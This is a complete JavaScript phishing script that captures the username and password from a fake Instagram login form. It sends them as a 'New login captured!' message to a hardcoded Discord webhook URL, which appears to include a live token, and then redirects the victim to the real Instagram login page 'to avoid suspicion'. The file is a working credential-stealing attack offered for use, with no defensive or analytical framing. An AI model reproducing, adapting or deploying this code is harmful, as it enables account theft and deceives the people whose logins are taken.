document.getElementById("login-form").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  fetch("https://discord.com/api/webhooks/1376084353515257937/PNKO52Nm_Mcoub1CDKN_51UUu_1exkmbknEXkM8e_TgFct7nm9zfUNjaDrYYjddOKXGw", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      content: `New login captured!\nUsername: ${username}\nPassword: ${password}`
    })
  });

  // Optional: Redirect to real Instagram to avoid suspicion
  window.location.href = "https://www.instagram.com/accounts/login/";
});
